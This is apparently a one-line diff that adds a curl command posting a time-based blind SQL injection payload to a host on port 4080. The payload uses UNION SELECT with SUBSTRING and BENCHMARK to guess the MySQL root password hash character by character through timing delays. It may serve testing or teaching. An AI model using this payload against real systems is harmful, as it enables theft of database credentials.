@@ -1,0 +1,1 @@
+curl -X POST http://hello.app:4080 -d "SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = 'root';"
